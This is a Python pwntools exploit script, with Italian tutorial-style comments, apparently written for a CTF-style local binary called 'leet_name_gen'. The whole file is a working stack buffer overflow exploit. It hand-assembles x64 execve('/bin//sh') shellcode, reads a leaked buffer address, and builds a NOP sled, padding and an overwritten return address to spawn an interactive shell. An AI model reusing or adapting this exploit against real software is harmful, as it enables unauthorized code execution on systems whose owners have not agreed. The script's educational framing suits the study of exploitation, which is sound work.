#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-

# Importo tutte le definizioni 
# (funzioni, costanti, classi) del modulo pwn
from pwn import *

# Modalita di debug, attiva GDB
debug = False

# Setto l'architettura del processore cosi pwntools sa come comportarsi
# nei riguardi degli indirizzi di memoria, degli opcode ecc.. e disabilitiamo "al volo" ASLR (***)
context.clear()
context(arch="amd64", os="linux", aslr=False)
context.terminal = "terminator -x".split()

# Mi creo "a mano" uno shellcode partendo dalle istruzioni assembly
# I parametri di una syscall per linux x64 vengono passati sui registri
# (in ordine) rdi, rsi, rdx...
# Qua chiamero' sys_execve() maggiori dettagli con "man syscall e man syscalls"

shellcode  = asm("xor rdx, rdx")                    # Pongo rdx = 0 = NULL (terzo parametro)
shellcode += asm("push rdx")                        # Carico 0 sullo stack (il terminatore di stringa!)
shellcode += asm("movq rax, 0x68732f2f6e69622f")    # Carico la stringa "/bin//sh" sullo stack, doppio slash per.... :D 
shellcode += asm("push rax")
shellcode += asm("lea rdi, [rsp]")		            # Copio l'indirizzo della stringa in rdi (primo parametro)
shellcode += asm("xor rsi, rsi")                    # Pongo rsi = 0 = NULL (secondo parametro)     
shellcode += asm("mov rax, 0x3b")                   # Copio la il numero della syscall che voglio invocare in rax(al) (sys_execve())                    
shellcode += asm("syscall")                         # "I WANT TO BELIEVE"

#Padding per lo shellcode. E' sempre buona norma, quando si lavora sullo stack allineare i blocchi di dati a 8 byte
shellcode = asm('nop') * (8 - len(shellcode) % 8) + shellcode

# Controllo che misure di sicurezza sono attive sull'eseguibile
# in particolare se e' o meno attivo il bit NX (Non eXecute bit per lo stack)
binary_file = ELF("./leet_name_gen")

# Lancio il processo che voglio esploitare
proc = process("./leet_name_gen", close_fds=False)

# Stringa che utilizzero' dopo
stringa = 'AAAAAAA\x00'

# Volendo posso agganciare GDB al processo nella fase di messa a punto dell'exploit
if debug:

    gdb.attach(proc, '''
    break *0x400946
    continue
    search-pattern {}
    '''.format(stringa))

# Catturo l'indirizzo in testa del buffer
proc.recvuntil('License code ')
buffer_start = int(proc.recvuntil(' ]', drop=True))
proc.recvuntil('>>')

# Grazie alla funzione cyclic() (**) sappiamo quale deve essere l'input
# che ci permette di sovrascrivere l'indirizzo di ritorno della funzione main()
input_len = 72

# Se il bit NX non e' attivo inietto lo shellcode
if binary_file.nx == False:
    
    nops = asm('nop') * 24
    buffer_start = p64(buffer_start + 16) # Perche +16? NOP NOP:)

    # Assemblo l'exploit
    # STRINGA -> NOPS -> SHELLCODE -> SPAZZATURA -> INDIRIZZO SU CUI RITORNARE
    exploit = stringa
    exploit += nops
    exploit += shellcode
    exploit += 'A' * (input_len - 8 - len(nops) - len(shellcode))
    exploit += buffer_start

    # Lancio l'exploit e mi metto in ascolto per agganciarmi alla shell
    proc.sendline(exploit)
    proc.recv()
    proc.interactive()
proc.close()

# (**) la funnzione cyclic() genera una sequenza di De Bruijn prevedibile di caratteri dato un alfabeto e utilizzando
#       poi la funzione cyclic_find() possiamo determinare l'esatta lunghezza
# (***) ATTENZIONE! Ci sono alcune limitazioni riguardo a processi SUID... controllare sulla documentazione di pwntools :)
